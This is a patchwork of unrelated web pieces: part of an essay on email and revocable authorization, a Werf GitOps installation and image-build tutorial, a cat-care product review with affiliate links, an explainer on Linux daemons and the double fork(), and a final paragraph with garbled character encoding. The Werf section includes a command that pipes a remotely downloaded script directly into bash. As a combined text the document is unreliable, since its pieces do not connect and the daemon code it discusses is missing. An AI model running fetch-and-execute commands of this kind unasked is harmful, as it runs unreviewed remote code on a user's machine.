with email and requiring email to carry some strong identification
doesn't solve the problem, as we've found out with all of the spam
email that has perfectly good DKIM signatures for some random new
domain.</p>

<p>(This is a version of <a href="https://utcc.utoronto.ca/~cks/space/blog/tech/TwoSidesOfIdentity">the two sides of identity</a>.
On the Internet people can trivially have multiple identities, so
while an identity is useful to only let selected people in, it's
not useful to keep someone out.)</p>

<p>I think that what you really care about with modern communication
protocols is <em>revocable authorization</em>. With a pull protocol, you
have this directly; you tacitly revoke authorization by stopping
pulling from the place you no longer like. With a push protocol,
you can still require authorization that you grant, which lets you
revoke that granted authorization if you wish. The closest email
comes to this is having lots of customized email addresses and
carefully using a different one for each service (which Apple has
recently automated for iOS people).</p>

<p>Obviously, requiring authorization to push things to you has a
fundamental conflict with any system that's designed to let arbitrary
strangers contact you without prearrangement (which is <a href="https://utcc.utoronto.ca/~cks/space/blog/spam/FundamentalSpamProblem">the
fundamental problem of spam</a>).
Modern protocols seem to deal with this in two ways (even with
revocable authorization); they have some form of gatekeeping (in
the form of accounts or access), and then they evolve to provide
settings that let you stop or minimize the ability of arbitrary
strangers to contact you (for example, Twitter's settings around
who can send you Direct Messages).</p>

<p>(The modern user experience of things like Twitter has also evolved
to somewhat minimize the impact of strangers trying to contact you;
for example, the Twitter website separates new DMs from strangers
from DMs from people you've already interacted with. It's possible
that email clients could learn some lessons from this, for example
by splitting your inbox into 'people and places you've interacted
with before' and 'new contacts from strange people'. This would
make DKIM signatures and other email source identification useful,
apart from the bit where senders today feel free to keep changing
where they're sending from.)</p>

<p>PS: In this view, actions like blocking or muting people on Twitter
(or the social network of your choice) is a form of revoking their
tacit authorization to push things to you.</p>

<p>This is the third post of a collection of GitOps tools articles. In this post, a continuous integration and continuous deployment tool for Kubernetes is reviewed:&nbsp;<strong>Werf</strong>. If you missed previous articles on GitOps tools, you could give them a read, as it will help you better understanding the general idea. <a href="https://kubesandclouds.com/index.php/2020/05/13/gitops/">ArgoCD</a> and <a href="https://kubesandclouds.com/index.php/2020/05/24/gitops-fluxcd/">FluxCD</a>, were the previously reviewed tools.</p>



<p>As for the previous tools, an example repository has been developed so that you can test Werf with some existing configurations. You can find the repository <a href="https://github.com/mifonpe/werf-kubesandclouds">here</a>.</p>







<h2>GitOps &amp; Werf ⛵</h2>



<p>GitOps is defined as a way of managing Kubernetes infrastructure and applications, in which git repositories hold the declarative definition of what has to be running in Kubernetes. A git repository is considered as the&nbsp;<em>single source of truth</em>&nbsp;in the GitOps model. With this approach, changes in the application definitions (code), are reflected on the infrastructure. Besides, it is possible to detect differences and drifts between the source controlled application and the different versions deployed.</p>



<p>GitOps allows faster delivery rates, as once the code is pushed to the production branch, it will be present in the cluster in a matter of seconds, increasing productivity. This Model also increases reliability, as rollbacks and recovery procedures are eased by the fact that the entire set of applications is control versioned by Git. Furthermore, stability and consistency is also improved.</p>



<p><a href="https://werf.io/">Werf</a> is an open source GitOps tool which aims to speed up application delivery by automating and simplifying the complete application lifecycle. To do so, Werf builds and publishes images, deploys applications to Kubernetes clusters, and removes unused images based on policies and rules defined in the Git repository.</p>







<p>Werf can build Docker images from Dockerfiles or using and alternative builder, which uses a custom syntax, and can support Ansible as well as incremental rebuilds based on Git history.</p>



<p>Werf deploys applications to Kubernetes using Helm-compatible charts with more extensive customizations. Furthermore, it provides rollout tracking, error detection and logging mechanisms for the application releases. The logic driving these mechanisms can be customized by means of Kubernetes annotations.</p>



<p>Werf is distributed as CLI written in go, so it can run virtually in any modern OS and it can be easily integrated with any CI/CD platform, as it has been developed to do so.</p>



<hr>



<h2>Installing Werf 💻</h2>



<p>In order to install Werf CLI, first you need to install Docker and Git in your machine. In case you haven’t installed them yet, you can find the installation instructions for Docker <a href="https://docs.docker.com/get-docker/">here</a>, and for Git <a href="https://git-scm.com/book/en/v2/Getting-Started-Installing-Git">here</a>. Once these dependencies are present, it’s time to install Werf.</p>



<p>Werf advises to install their CLI by means of the <a href="https://werf.io/documentation/guides/installation.html#method-1-recommended-by-using-multiwerf">multiwerf </a>utility, which ensures that the Werf CLI is always up to date. Execute the following commands to get it installed in your machine.</p>



<pre><code>export PATH=$PATH:$HOME/bin
echo 'export PATH=$PATH:$HOME/bin' &gt;&gt; ~/.bashrc
mkdir -p ~/bin
cd ~/bin
curl -L https://raw.githubusercontent.com/werf/multiwerf/master/get.sh | bash</code></pre>



<p>Select the Werf version to use and configure your terminal session to use that version by issuing the following command. Werf provides <a href="https://werf.io/releases.html">5 stability levels</a> to choose from, so that you can choose a level depending on your environments and needs.</p>



<pre><code>. $(multiwerf use 1.1 stable --as-file)</code></pre>



<p>In case you don’t want to use multiwerf features, you can just follow the ‘old good’ approach and get a specific version of the Werf CLI binary form <a href="https://werf.io/documentation/guides/installation.html#method-2-by-downloading-binary-package">here</a>.</p>



<hr>



<h2>Project structure 📁</h2>



<p>Werf expects files to be organized following a specific structure within the code repository. The image below shows the structure of the example repository that we will be using for this post, which contains a simple webpage (in <strong>/web</strong>) that is packaged in a nginx Docker image, and deployed to a Kubernetes cluster using Helm.</p>



<div><figure><img src="https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-9.47.02-AM.png" alt="" srcset="https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-9.47.02-AM.png 345w, https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-9.47.02-AM-300x257.png 300w" sizes="(max-width: 345px) 100vw, 345px"></figure></div>



<p>On the top level of the repository you can find <strong>werf.yaml</strong>, a YAML configuration file for Werf which defines how to build the images, and contains some metadata and directives that allow customizing the behavior of Werf. This file contains metadata information, images build information and artifacts build information each part separated by three hyphens. Werf also supports Go templates for the <strong>werf.yaml</strong> file, as you can notice in the last line of the following example, making configurations really powerful. Besides, by including different templates, <strong>werf.yaml</strong> can be split into different files, to better handle complex configuration scenarios.</p>



<pre><code>project: my-project
configVersion: 1
---
image: app
from: java:8-jdk-alpine
...
---
{{ include "artifact/appserver.tmpl" . }}</code></pre>



<p>At the same level you can find a <strong>Dockerfile</strong>, used to build the image. This <strong>Dockerfile</strong> can be directly referenced from<strong> werf.yaml </strong>to be used. However, Werf supports custom syntax to build images, directly specified within <strong>werf.yaml</strong> as you will see in the upcoming examples.</p>



<p><strong>.helm</strong> directory contains the Helm charts to be used by Werf to deploy the application, organized following the <a href="https://helm.sh/docs/topics/charts/#the-chart-file-structure">Helm chart file structure</a>. Notice that <strong>Chart.yaml</strong> is not included as it is not used by Werf.</p>



<hr>



<h2>Building images 📦</h2>



<p>First, clone the examples repository to get started.</p>



<pre><code>git clone https://github.com/mifonpe/werf-kubesandclouds.git
cd werf-kubesandclouds</code></pre>



<p>Building images from a Dockerfile is the easiest way to start using Werf in an already existing project. To do so, you will only need to add the<em> dockerfile </em>directive with the Dockerfile name (Dockerfile in this case) under the image config in your <strong>werf.yaml</strong> file.</p>



<pre><code>project: kyc-project
configVersion: 1
---
image: web-server
dockerfile: Dockerfile</code></pre>



<p>The code below shows the contents of the Dockerfile. It is fairly simple, as it just adds the webpage and its media to the image and exposes the port 80 fort the nginx server to listen on.</p>



<pre><code>FROM nginx:latest

COPY web/index.html /usr/share/nginx/html
COPY web/kyc.png /usr/share/nginx/html
EXPOSE 80 
CMD ["nginx", "-g", "daemon off;"]</code></pre>



<p>However, Werf provides advanced features for image building, eliminating the need for Dockerfiles, although they can be combined with the Werf builder syntax. Besides, you can build as many different images as you need using just one Werf configuration file (<a href="https://werf.io/documentation/guides/advanced_build/multi_images.html">multi-image build</a>). The code below shows the contents of the <strong>werf.yaml</strong> file of the <a href="https://github.com/mifonpe/werf-kubesandclouds">example repository</a>.</p>



<pre><code>project: kyc-project
configVersion: 1
deploy:
  helmRelease: werf-test
  helmReleaseSlug: false
  namespace: default
---
#image: web-server
#dockerfile: Dockerfile

image: werf-web
from: nginx:latest

ansible:
  install:
  - debug:
      msg: 'Start install'
  - file:
      path: /usr/share/nginx/html
      mode: 0755
  - file:
      path: /web
      state: directory
      mode: 0755
  - debug:
      msg: 'End install'
      
git:
- add: /web
  to: /usr/share/nginx/html
  owner: nginx
      
#shell:
#  beforeInstall:
#  - mkdir /web
  
docker:
  WORKDIR: /web
  CMD: ["nginx", "-g", "daemon off;"]
  EXPOSE: '80'
  ENV:
    BUILDER: werf-custom </code></pre>



<p>In this case, the image is built using different Werf directives. First, Ansible syntax is used with the <em>ansible</em> directive, to modify and create some directories. Shell commands can be executed during the building phase with the <em>shell</em> directive, however, when using <em>ansible</em> directives, <em>shell</em> directives cannot be used and vice versa. Notice the commented <em>shell</em> directive as an example.</p>



<p>Blocks inside the <em>ansible</em> and <em>shell</em> directives are known as Werf assembly instructions. Werf provides four user stages for executing these instructions: <em>beforeInstall</em>,&nbsp;<em>install</em>,&nbsp;<em>beforeSetup</em>, and&nbsp;<em>setup</em>. They are executed respectively, one after another. If you want to know more about user stages and the wide range of possibilities they offer, check<a href="https://werf.io/documentation/configuration/stapel_image/assembly_instructions.html#what-are-user-stages"> this documentation</a>.</p>



<p>The <em>git</em> directive is used to add files from the local Git repository into the image, but it can be used to add files from remote repositories too, allowing you to specify the branch, tag or commit to use, as well as path-based filters. Besides, this directive can be used to trigger the rebuilding of images when specific changes are made inside a Git repository. To see a comprehensive description of the directive and its capabilities, check <a href="https://werf.io/documentation/configuration/stapel_image/git_directive.html">this documentation</a>.</p>



<p>Finally, the <em>docker</em> directive is used following a Dockerfile-like syntax in order to build the image. You can check the details of this directive <a href="https://werf.io/documentation/configuration/stapel_image/docker_directive.html">here</a>.</p>



<p>To build your docker image, you just need to execute the following command within the root level of your repository, so that the CLI can find the <strong>werf.yaml</strong> file. Note the <em>–stages-storage</em> flag, which indicates to Werf where to store the built <a href="https://werf.io/documentation/reference/stages_and_images.html#stages">stages</a>, which are the intermediate layers that are used to generate the image. In this case, by using the local flag, Werf will store the stages using the local docker runtime.</p>



<pre><code>werf build --stages-storage :local</code></pre>



<p>During the build process, the different stages are executed and their outputs are shown in the terminal.</p>

<p>Once the image is built successfully, you can push it to an images repository. For this example I used a <a href="https://hub.docker.com/">Dockerhub</a> public repo for simplicity. If you don’t have an account yet, just sign up and create a public repository. Once it’s ready, generate an access token so that Werf can push the built images to the repository. To push the image, issue the following command.</p>



<pre><code>werf publish --stages-storage :local --images-repo &lt;your-repo&gt;  --tag-custom v0.0.1  --images-repo-docker-hub-token  &lt;your-token&gt;</code></pre>



<div><figure><img src="https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-3.56.49-PM.png" alt="" srcset="https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-3.56.49-PM.png 883w, https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-3.56.49-PM-300x75.png 300w, https://kubesandclouds.com/wp-content/uploads/2020/08/Screen-Shot-2020-08-31-at-3.56.49-PM-768x191.png 768w" sizes="(max-width: 883px) 100vw, 883px"></figure></div>



<p><strong>TIP:</strong> If you prefer using a local Docker repository, rather than using Dockerhub, you can just run the following command, and specify <em>–images-repo localhost:5000/your-repo-name</em> when issuing the <em>werf publish</em> command.</p>



<pre><code>docker run -d -p 5000:5000 --restart=always --name registry registry:2</code></pre>



<p><strong>TIP 2:</strong> You can build and publish your image by just using one command.</p>

		<p>I love my two cats dearly and they bring a lot of joy to my life, but they also bring other things, like poop, and fur.&nbsp; When I tried to research mitigations for any of these it was 100% SEO listicles, so I’m sharing my raw data in the hopes that the next person can find something real-if-incomplete instead of a list of every automated litter box that has ever been manufactured.</p>
<p>I wrote the bulk of this in February, but then one of the cats developed dermatitis and I put it on pause until I could make sure it wasn’t caused by anything on this list. Alas, it wasn’t, she’s just allergic to my new apartment. But then I wanted to test something else, and suddenly six months had passed. So if the tenses seem weird, that’s why.</p>
<p>(Links are affiliate links when possible)</p>

<p>I screwed up choosing my new apartment (this was written before the allergy thing). I remembered to check for space to put the litter box in the bathroom, but in my joy at finding a place that allowed that at all after so many that did not,&nbsp; I forgot to check if that space was also where you stood to wash your hands. So I ended up having to put the box in the living room. I’ve done that before and didn’t want to go back to having to keep the window open year round and still smelling poop. I also didn’t love the aesthetic.&nbsp; So I set up something kind of elaborate.</p>
<h2><a href="https://kittyvent.com/products/kitty-vent">KittyVent Litter Box Ventilator</a></h2>
<p>This is a long piece of hosing with a gentle fan in it, and a plastic thingy to block off a window that has a hole for the hose to connect to (similar to what you’d use for a portable air conditioner)</p>
<p><img src="https://cdn.shopify.com/s/files/1/2969/4434/products/IMG_0842_075fb887-2c88-400b-9bc8-3973573e3915_1024x1024@2x.jpg?v=1545953794" width="423" height="282"></p>
<p>The window-blocking thing works vertically but won’t stay up on its own, I had to tape it. The fan is extremely quiet, you can’t tell it’s on from more than six inches away. I’m very sure it works because the first time I noticed a smell, I found the fan had been turned off.</p>
<p>There are instructions for how to DIY this available online (e.g. <a href="https://www.instructables.com/id/Cat-Litter-Box-Odor-Eliminator-Fan-FlowCat/">here</a>), but I just bought it and it worked fine.</p>
<h2>Litterbox Holding End Table</h2>
<p>To make it less hideous, I got an end table designed to hold a litter box. Amazon is full of these, but most have only a single entrance and no ventilation. I assume these are aimed at people who haven’t thought things through. I wanted something I could connect a vent to and actually get rid of the smell. You might be able to cut a hole in one of the ventless ones to attach the hose to but I didn’t feel like bothering, so I got one with ventilation.</p>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/91iP7ZrigoL._AC_SL1500_.jpg" width="443" height="420"></p>
<p>I chose ecoFlex (<a href="https://www.amazon.com/gp/product/B01BM8E4KK/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B01BM8E4KK&amp;linkId=12a658675d21d4d4f9cad298d5ba2314">affiliate link</a>)&nbsp; because matched my it existing furniture and was the only option with both ventilation holes and a second shelf. For this, I accepted it being really much larger than it needed to be. Also the copytext said something about liquid-proof, non-smell-absorbant material, although who knows how true that is. Then I packing taped the ventilation hose to a hole in the back that wasn’t shown in the pictures, apparently intended for electric cords to automated litter boxes.</p>
<p>My cats adapted stupidly well to this- when I set up the litter box with the door open, they both used it within 10 minutes, despite their other litter box still being available. They did just as well when I closed the door.</p>
<p>Some litter does escape the table, so have a plan for that.</p>
<h2>Dog Poop Bags</h2>
<p>My weird conservation instincts push me not to empty the litter box until I can fill a bag. Otherwise I’m wasting valuable bag. So I bought a bunch of very small, very cheap bags and stored them in that shelf in the litter box end table, which is why I wanted it so much. I chose Amazon Basics Dog Poop Bags (<a href="https://www.amazon.com/gp/product/B00NABTGY2/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B00NABTGY2&amp;linkId=4d1641dea9b445b48539e119879ecada">affiliate link</a>) based on WireCutter’s <a href="https://thewirecutter.com/reviews/best-dog-poop-bags/">recommendation</a> and so far they are resoundingly fine.</p>
<h2>Dr Esley Cat Litter (<a href="https://www.amazon.com/gp/product/B07L9WFY14/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B07L9WFY14&amp;linkId=37e0a6f0fb2ce49f0ba47c52c36791d7">affiliate link</a>)</h2>
<p>I got this because Sweethome recommended it. I didn’t appreciate how much better it was working until a delivery screw up made me use <a href="https://www.amazon.com/gp/product/B06ZZYMWVT/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B06ZZYMWVT&amp;linkId=e9f8cccc7ed36fc1765011ac565da4d4">Arm and Hammer</a> and there started to be a smell where there hadn’t been before.</p>

<h2><a href="https://www.litter-robot.com/litter-robot-3.html">Litter Robot 3</a></h2>
<p>This is so close to being a truly great product, but isn’t quite reliable enough to be the only litter box. It had a tendency to get stuck in an unusable position, which eventually forces the cats to go elsewhere. The drawer the poop stays in doesn’t completely contain the smell. Also the range of litter between “excess will get dumped” and “too low” is uncomfortably thin. I’d still recommend it as a second litter box to cut down on scooping, or in a populous household where there will always be someone to turn it off and on again.</p>
<h2>Two Layer Litter Mat (<a href="https://www.amazon.com/gp/product/B00G67FD6W/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B00G67FD6W&amp;linkId=9e1bbec26c9a003b834013f6cbb1bc7d">affiliate link</a>)</h2>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/81BjAf-AA6L._AC_SL1000_.jpg"></p>
<p>This actually worked great at its stated purpose of catching litter the cats track out of the box, but when the cats pooped on it (say, because the litter box had been upside down for six hours), it was almost impossible to clean, especially if I caught it less than instantly. Plus it is ugly.</p>
<h2>Open Window with a Fan</h2>
<p>This was definitely better than not having an open window with a fan, but there’s no comparison between it and the vent-with-hose.</p>


<h2>Silicone Grooming Gloves (<a href="https://www.amazon.com/gp/product/B01N9KSITZ/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B01N9KSITZ&amp;linkId=cf4e5b0147e03c93e42da573c5afaf32">affiliate link</a>)</h2>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/713JHXyZS9L._AC_SL1000_.jpg" width="356" height="321"></p>
<p>These collect a lot of hair, plus their squishiness means you can brush bony areas that would be a problem for a metal comb. The cats start purring the instant I pet them with these.</p>
<p>Downside: kind of a pain to get the hair off the glove, does not pick up 100% of the fur it loosens, so be sure to use it somewhere easy to vacuum or at least not your own lap.</p>

<h2>The Dryer</h2>
<p>Turns out dryers are reasonably good at removing cat hair if you wait long enough. Remember to clean the lint trap frequently.</p>
<h2>Reusable Lint Roller</h2>
<p>I tried two made of the same material- a paddle shaped one (<a href="https://www.amazon.com/gp/product/B07SBM761G/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B07SBM761G&amp;linkId=94a8f23a77ace6722af2df51d72f696b">affiliate link</a>)</p>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/71Dh0-dIIwL._SL1467_.jpg" width="341" height="324"></p>
<p>and a more traditional roller shaped one (<a href="https://www.amazon.com/gp/product/B00BAGTNAQ/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B00BAGTNAQ&amp;linkId=cb9987743b51a7b5feea72739bf6ac92">affiliate link</a>)</p>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/61VbLSzuCrL._SL1500_.jpg" width="340" height="272"></p>
<p>Of these, I found the wand shaped one easier to use, and the roller easier to clean. I prioritized use, but your mileage may vary. Also, you need to actually read the instructions on how to use it, running it back and forth like disposable lint roller just redistributes the hair.</p>
<p>Here is a picture of a pillow after I ran the paddle shaped one over part of it several times. I think this gives a good idea of what it’s capable of, i.e. it’s a significant improvement but doesn’t get everything.</p>
<p><img src="https://lh3.googleusercontent.com/CdwlDpVYOYR7uoDoi2G-hNc8DLvvdJcuKTEiekukqxS_Ao3h9i5dMpu5j-s6GWrwGTe-34ILa7rc-Y83frrUc5SpqWEqErREaYHV8QACkzN1Qc7ziND_ZkQ7bPRcB2J6jcr9cxcOWwBpDKwT-zVo5dalEK1QTcm5cntNpZpe213JKFvj0cH-3aSXp9gjvW_yvmj_PRXNWBOEbkCwYiz_sVkrhebNvKv48qHgcu0hq7P-cW5DGbFncCoHJYGk0hn5zUSJGTfBZycsdWoq9wwXV3fepvtl8koVwGgAZTu-eGAifmoPK1RIQurOfZd8aYCANtifgD21PKFn0UTrFUx6gJ1paCdQ2uEVuYunpuxPVALjhQddhCI74D525eMhQ2b7-pj7q74Q9s-DI1_DHsmdvxwlGAzbPKowjkgj_XCi3kcq6MgV4ApNaZvSE89ZV3dok7peQEkh3WdP6p_V5WZbTMLdxwSqrUWU2gWNgt5R9Su6mxnSad_vpkMcSmCmln5j5aLfC0hBCOPWtYBiZ20pr0x9q2atPvG6kUhElanjCNtJBYvsgewnqxSCbzqB0tcfJ3UNFuETuFCgQ_kSU_5JMMeqa2oi94i1GH2Gogjm9wMKO3iruENNYaRmHW-9ogCsfvOHPPP558lJu78AOFY3Ld2zEjEfijgu22QP1U3vxkZBFGR_fKbfkvI=w1760-h1320-no" width="340" height="255"></p>
<p>Note: inbetween writing this and publishing, the paddle brush people offered me actual money to publish a review, which I plan on taking them up on, assuming I can find the form.</p>
<h2>Shark Pet-Perfect II Handheld Vacuum (<a href="https://www.amazon.com/gp/product/B0037HHFMO/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B0037HHFMO&amp;linkId=4140bcc636b3132e9c69552f56ebb21e">affiliate link</a>)</h2>
<p>Sweethome’s top handheld vacuum pick was sold out everywhere and their second is specifically called out as being bad at fur, so I selected based on Amazon reviews. As a vacuum cleaner it is Not Fucking Around- it is super powerful and sucks anything off my floors. It advertises a special whirling brush aimed specifically at pet hair, but I found it choked on soft surface I tried it on, and the bristles were better. The biggest complain on Amazon was the battery life, but I got it for spot cleaning not marathons, so it’s been fine and I appreciate not paying for a feature I don’t use.</p>
<p>All of the anti-cat-hair devices work better if I stay very on top of them. Given time, the fur works itself deeper into the fabric and nothing will work except picking it out with actual human fingers.</p>

<h2>The Furminator (<a href="https://www.amazon.com/gp/product/B07MZLNVSW/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B07MZLNVSW&amp;linkId=ea4961e2a9d1ed7f9540a55d8364f886">affiliate link</a>)</h2>
<p>This is another one that was great at its official objective but failed a secret objective. It was absolutely amazing at removing fur from the cats (on areas broad and unbony enough to support the comb), and they liked it, but it left them less soft. I did not get these cats to have them at less than their maximum softness.</p>
<h2><span>Rubber Thingies You Throw in the Washer and Dryer&nbsp;</span></h2>
<p><img src="https://images-na.ssl-images-amazon.com/images/I/71uRMoJP33L._AC_SL1500_.jpg" width="402" height="402"></p>
<p>I ran an experiment and as far as I can tell these are no better than just running an article through the dryer. Before/after photos (which I unfortunately didn’t save) didn’t show more hair being removed and the thingies are completely free of hair after many uses, which suggests to me they’re not helping much.</p>
<p>I tried wetting them and running them over a pillow case and they indeed picked up something, so I’m leaving them in my washer just in case.</p>
<p>I used LEADTEAM (<a href="https://www.amazon.com/gp/product/B07THZ68TT/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=acesoundergla-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=B07THZ68TT&amp;linkId=8efe81ab9e97d47fa558f5f04ff3d1f9">affiliate link</a>) and didn’t test any others, they looked identical.</p>

<p><img src="https://images-na.ssl-images-amazon.com/images/I/410dKWoCFkL._AC_.jpg" alt="Smart Sheep Reusable Wool Dryer Balls, 3-Pack" width="337" height="320"></p>
<p>Testing the dryer inserts is difficult because it’s really hard to get a control group. I can’t put in half a blanket and see what the other half does. I can’t even use my two identical blankets, because they’re not guaranteed to have identical amounts of hair on them. I tried with socks but was kind of out of patience by that point. I was pretty confident the rubber ones were doing nothing, but despite a really silly amount of rigor involving photos and test swabs with the lint roller, I just can’t tell with these.</p>
<h2>Disposable Lint Rollers</h2>
<p>These were better than nothing but not as good as the reusable roller.</p>

<p>My cats were never great at eating but had gotten to the point where between the two of them someone was vomiting almost every day without cause (cause = “I went too long without eating”, “I ate too fast because I went too long without eating” and hairballs), and one had lost a noticeable amount of weight (her current weight would be fine if she’d started there, but losing almost 20% of her body weight for no known reason is concerning). There was also behavior that made me think they didn’t like their food- things like persistently begging and then when I put new food down, sniffing it, looking upset and begging more. So I talked to the vet.</p>

<p>I started both of these at the same time and now the cats are down to vomiting once a week, tops, some of which is for cause. They don’t love the prescription food by they will eat it. They’re fine with the vitamins.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainEntityOfPage">
		
<p>In this article, we’ll take a closer look at daemons. We’ll understand exactly what they are, how they’re implemented, and the scope of their responsibility.&nbsp;</p>



<h2><strong>Overview</strong></h2>



<p>Simply put, a daemon (pronounced dee-mon) is an intentionally orphaned background process. Additionally, daemons are detached from the terminal in which they’re spawned, operate without user interaction, and are descendants of the system’s init process.</p>



<p>Daemons will silently wait in the background for specific events to occur or conditions to be met before executing.</p>



<p>At boot time, Linux will start the init process (init is itself a daemon) which will serve as the parent of all processes and assign it PID 1 (process identification number). It’s important to mention that the init function is a special process that is not attached to any terminal.</p>



<p>After the boot sequence is complete, Linux will start up any previously declared daemons. These will be created through a series of fork() and exit() commands which will intentionally create an orphaned process that will eventually be adopted by the init process – more on this soon.</p>



<h2><strong>Use Cases</strong></h2>



<p>Conventionally, daemon process names end with the letter “d”. If you’re interested in seeing all daemons installed on your Linux machine, use this command:</p>



<p><code>service --status-all</code></p>



<p>You’ve certainly encountered daemons whether you were aware of them or not:&nbsp;</p>



<ul><li>A web server is simply a process that runs continuously in the background waiting to process and respond to HTTP requests (http daemon)</li><li>sshd is the dameon responsible for SSH operations</li><li>“MAILURE_DEMON” is a daemon that notifies the sender of invalid email recipients&nbsp;</li><li>Monitoring hardware activity like hard drive health&nbsp;</li><li>cron jobs</li></ul>



<h2><strong>Implementation</strong></h2>



<p>We’ll take a look at the code to create a daemon shortly, but let’s establish some basics first.&nbsp;</p>



<p>Calling the fork() function creates a new process referred to as the child process. The child process runs in parallel with the process that triggered the fork() (the parent process).&nbsp;</p>



<p>A child process shares the same program counter and CPU registers as its parent. So, when a new child process is created, both the child and parent processes will execute the next instruction after the fork() call in parallel.&nbsp;</p>



<p>Here’s a simple example from Michigan Tech:&nbsp;</p>



<div><figure><img src="https://lh5.googleusercontent.com/Q9blfMxaFBFWjoLw_h9HxBAJYRhW5WO6ws4atHZKsY-6Bf5y9bu-EBQJ7qJ8F_piFCvK6wct0U-l9ykXRpt1DZZy_XdJZRCjnjx7WNjLpQu8sx59rsdAxQ25y-PGCJdGJ_VvpzwL" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>After fork(), both the parent and the child processes execute the following code in parallel.</p>



<div><figure><img src="https://lh3.googleusercontent.com/OeO_ztEonrxuE5Lw-N_7YS-3gOl0G0h8lQHUdax3632W6aooeiDSf7wOBIGU1aqyF_yCs6hnHv1IqJxtreeTsS_mkdukzMqcfbw2wPp_eEisclimHbtDUC45tetfvxQ_moeOVIvb" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>You can also make their execution paths differ if desired. If the fork() call succeeds, the PID of the child process is returned in the parent, and 0 is returned in the child.&nbsp;</p>



<p>In order to create a daemon, we’ll fork() to create a child process and then exit() the parent. This, as previously mentioned, will purposefully create an orphaned process that will be adopted by init. </p>



<p>Our new daemon is now free to sit silently in the background outside of any terminal and perform its task.</p>



<p>While this is a practical understanding, the actual implementation is a bit more nuanced. </p>



<p>We’ll need to make sure to do the following:</p>



<ul><li>Close all open file descriptors</li><li>Change the working directory</li><li>Separate from the terminal and ignore I/O signals</li><li>Disassociate from the process group and control terminal</li><li>Don’t reacquire a control terminal </li><li>Reset the file access creation mask</li></ul>



<p>The following implementation is inspired by Pascal Werkl’s work. I’ve added additional documentation to make it more approachable for someone that is unfamiliar with C and/or Linux systems. I encourage you to <a href="https://github.com/pasce/daemon-skeleton-linux-c/">checkout the original code here</a>.</p>







<h2>Understanding the double fork()</h2>



<p>Let’s try and understand why we need 2 fork() calls in the code above.&nbsp;</p>



<p>When we run this program in the terminal, several environmental settings – specifically the shell we’re working in – are replicated to our child process. So, we’ll need to disassociate our daemon from its spawning terminal.</p>



<p>That’s why we call <code>setsid()</code> and create our own independent session for the child process. </p>



<p>However, in doing so, this child process will be in its own session and process group and therefore it’ll be its own session leader. The main takeaway here is that there is potential for the session leader to reacquire a terminal later on (i..e. if say the user were to open up another terminal). </p>



<p>We don’t want that. Remember, we want to be completely independent of the terminal and any user-input.</p>



<p>By calling fork() a second time, we ensure that this new process (fork-2) will have a PID outside the bounds of fork-1’s session. Since we are not calling <code>setsid()</code> on the fork-2 process, no new session is being made. In other words, we know that fork-2 is <em><strong>not</strong></em> a session leader and therefore there’s no risk of it acquiring a terminal in the future. </p>



<p>Finally, by killing fork-2’s parent, we know that we’ve created an orphaned process that is adopted by init and can’t reacquire a terminal or be affected by user input.</p>



<blockquote><p>TLDR: The 2 fork() calls removes any chance of the daemon reacquiring a controlling terminal and helps ensure that the daemon is re-parented onto init. </p><p>If the use of the secondary fork() isn’t clear, don’t worry – it’s more to do with handling a potential edge case in the environment than a necessity in a generic daemon implementation.</p></blockquote>



<h2><strong>Wrapping Up</strong></h2>



<p>Thanks for checking out this article! If you have any topic requests, please contact me or leave a comment below!</p>



<p>If you’re interested in seeing all installed daemons on your machine, use this command on Linux machines:&nbsp;</p>



<p><code>service --status-all</code></p>



<blockquote><p>Remember daemon names generally end in “d”</p></blockquote>

<p>Only much later could I count the mistakes in that statement. No, it wouldnâ€™t take â€˜just a secondâ€™; no, I didnâ€™t â€˜needâ€™ to respond to the email â€“ Iâ€™m an author and researcher, and thus rarely receive messages that have a drop-everything-and-answer urgency to them. And no, it wouldnâ€™t be â€˜one thingâ€™. My brain would be too tempted, Iâ€™d feast on it all.</p>
